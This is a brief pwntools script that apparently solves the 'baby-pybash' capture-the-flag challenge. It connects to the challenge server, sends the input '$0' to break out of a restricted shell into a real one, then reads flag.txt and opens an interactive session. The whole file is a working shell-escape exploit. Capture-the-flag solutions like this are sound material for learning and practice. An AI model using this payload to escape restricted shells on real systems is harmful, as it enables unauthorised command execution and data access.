from pwn import *

p = remote("baby-pybash.challs.csc.tf", 1337)

p.sendlineafter(b": ", b"$0")
p.sendline(b"cat flag.txt")
p.interactive()
